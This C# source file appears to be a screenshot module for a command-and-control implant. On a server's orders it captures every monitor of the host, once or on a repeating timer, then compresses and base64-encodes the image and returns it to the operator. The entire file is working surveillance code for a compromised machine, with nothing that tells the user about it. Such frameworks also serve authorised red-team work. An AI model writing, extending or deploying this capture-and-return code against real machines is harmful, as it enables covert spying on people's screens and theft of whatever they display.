using System;
using System.Collections.Generic;
using System.Drawing;
using System.IO.Compression;
using System.Runtime.InteropServices;
using System.Text.Json;
using System.Threading;
using System.Threading.Tasks;
using Agent.Interfaces;
using Agent.Models;
using Agent.Utilities;
using screenshot;


namespace Agent
{
    public class Plugin : IPlugin
    {
        public string Name => "screenshot";
        private IMessageManager messageManager { get; set; }
        private System.Timers.Timer screenshotTimer;
        public CancellationTokenSource cts = new CancellationTokenSource();

        public Plugin(IMessageManager messageManager, IAgentConfig config, ILogger logger, ITokenManager tokenManager, ISpawner spawner)
        {
            this.messageManager = messageManager;
        }

        public async Task Execute(ServerJob job)
        {
            int intervalInSeconds = 0; // Default interval should be 0 to just take one

            ScreenshotArgs args = JsonSerializer.Deserialize<ScreenshotArgs>(job.task.parameters);

            if (args.interval <= 0)
            {
                await CaptureAndSendScreenshot(job.task.id);
                cts.Cancel();
            }
            else
            {
                cts = new CancellationTokenSource();
                screenshotTimer = new System.Timers.Timer(args.interval * 1000); // Convert seconds to milliseconds
                screenshotTimer.Elapsed += async (sender, e) =>
                {
                    if (!cts.Token.IsCancellationRequested)
                    {
                        await CaptureAndSendScreenshot(job.task.id);
                    }
                };

                // Set AutoReset to false for a one-time execution if the interval is greater than 0
                screenshotTimer.AutoReset = args.interval > 0;
                screenshotTimer.Enabled = true;
                await messageManager.AddResponse(new TaskResponse
                {
                    completed = true,
                    user_output = $"Capturing screenshots every {args.interval} seconds!!.",
                    task_id = job.task.id,
                });
            }
        }

        private async Task CaptureAndSendScreenshot(string task_id)
        {
            try
            {
                var bitmaps = ScreenCapture.Capture();

                // Determine the size of the combined bitmap
                int combinedWidth = 0;
                int maxHeight = 0;
                foreach (var bitmap in bitmaps)
                {
                    combinedWidth += bitmap.Width;
                    if (bitmap.Height > maxHeight)
                    {
                        maxHeight = bitmap.Height;
                    }
                }

                // Create a new bitmap to hold the combined image
                var combinedBitmap = new Bitmap(combinedWidth, maxHeight);

                // Draw each screen's bitmap onto the combined bitmap
                int x = 0;
                foreach (var bitmap in bitmaps)
                {
                    using (var graphics = Graphics.FromImage(combinedBitmap))
                    {
                        graphics.DrawImage(bitmap, x, 0);
                    }
                    x += bitmap.Width;
                }

                // Convert to base64
                var converter = new ImageConverter();
                var combinedBitmapBytes = (byte[])converter.ConvertTo(combinedBitmap, typeof(byte[]));
                byte[] outputBytes;

                // Compress the image
                using (var memoryStream = new MemoryStream())
                {
                    using (var gzipStream = new GZipStream(memoryStream, CompressionMode.Compress))
                    {
                        gzipStream.Write(combinedBitmapBytes, 0, combinedBitmapBytes.Length);
                    }
                    outputBytes = memoryStream.ToArray();
                }

                var combinedBitmapBase64 = Convert.ToBase64String(outputBytes);
                await messageManager.AddResponse(new TaskResponse
                {
                    completed = true,
                    user_output = "Screenshot captured.",
                    task_id = task_id,
                    process_response = new Dictionary<string, string> { { "message", combinedBitmapBase64 } },
                });
            }
            catch (Exception e)
            {
                await messageManager.Write($"Failed to capture screenshot: {e.ToString()}", task_id, true, "error");
            }
        }
    }

    internal class ScreenCapture
    {
        internal static List<Bitmap> Capture()
        {
            var bitmaps = new List<Bitmap>();
            foreach (var screen in GetScreens())
            {
                var bitmap = new Bitmap(screen.Width, screen.Height);
                using (var graphics = Graphics.FromImage(bitmap))
                {
                    graphics.CopyFromScreen(screen.X, screen.Y, 0, 0, bitmap.Size);
                }
                bitmaps.Add(bitmap);
            }
            return bitmaps;
        }

        private static IEnumerable<Screen> GetScreens()
        {
            var screens = new List<Screen>();
            foreach (var displayInfo in GetDisplayInfos())
            {
                var bounds = new Rectangle(
                    displayInfo.Bounds.X,
                    displayInfo.Bounds.Y,
                    displayInfo.Bounds.Width,
                    displayInfo.Bounds.Height);

                screens.Add(new Screen(bounds));
            }
            return screens;
        }

        private class Screen
        {
            public int X { get; }
            public int Y { get; }
            public int Width { get; }
            public int Height { get; }

            public Screen(Rectangle bounds)
            {
                X = bounds.X;
                Y = bounds.Y;
                Width = bounds.Width;
                Height = bounds.Height;
            }
        }

        [DllImport("user32.dll")]
        private static extern bool EnumDisplayMonitors(IntPtr hdc, IntPtr lprcClip, MonitorEnumProc lpfnEnum, IntPtr dwData);

        private delegate bool MonitorEnumProc(IntPtr hMonitor, IntPtr hdcMonitor, ref RECT lprcMonitor, IntPtr dwData);

        [StructLayout(LayoutKind.Sequential)]
        private struct RECT
        {
            public int left;
            public int top;
            public int right;
            public int bottom;
        }

        private class DisplayInfo
        {
            public Rectangle Bounds { get; set; }
        }

        private static List<DisplayInfo> GetDisplayInfos()
        {
            var monitors = new List<DisplayInfo>();

            var proc = new MonitorEnumProc((IntPtr hMonitor, IntPtr hdcMonitor, ref RECT lprcMonitor, IntPtr dwData) =>
            {
                var mi = new DisplayInfo();
                mi.Bounds = new Rectangle(lprcMonitor.left, lprcMonitor.top, lprcMonitor.right - lprcMonitor.left, lprcMonitor.bottom - lprcMonitor.top);
                monitors.Add(mi);

                return true;
            });

            if (!EnumDisplayMonitors(IntPtr.Zero, IntPtr.Zero, proc, IntPtr.Zero))
            {
                throw new System.ComponentModel.Win32Exception();
            }

            return monitors;
        }
    }
}
